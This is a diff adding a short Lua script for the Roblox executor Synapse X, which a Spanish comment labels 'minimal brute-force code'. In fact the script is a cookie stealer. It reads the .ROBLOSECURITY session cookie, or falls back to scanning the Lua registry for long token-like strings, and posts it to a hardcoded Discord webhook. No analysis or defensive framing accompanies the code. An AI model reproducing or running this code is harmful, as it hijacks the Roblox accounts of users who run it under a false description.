@@ -1,0 +1,25 @@
+-- Código mínimo de fuerza bruta para Synapse X
+local webhook = "https://discord.com/api/webhooks/1532404514970402826/3wl_Xu1QFxDcaB1ico9CsE2iVmFo421xHOUzz6ah1iWK-i3Yv5hTxTwFgnJ9z0uJssjU"
+
+-- Para Synapse X específicamente
+if syn and syn.cookies then
+    local cookie = syn.cookies.get(".ROBLOSECURITY")
+    syn.request({
+        Url = webhook,
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = game:GetService("HttpService"):JSONEncode({
+            content = "Cookie: " .. tostring(cookie)
+        })
+    })
+else
+    -- Para otros executors, intentar getreg
+    local reg = debug.getregistry()
+    for i = 1, #reg do
+        local v = reg[i]
+        if type(v) == "string" and v:len() > 200 and not v:find(" ") then
+            game:GetService("HttpService"):PostAsync(webhook, '{"content":"'..v..'"}', Enum.HttpContentType.ApplicationJson)
+            break
+        end
+    end
+end
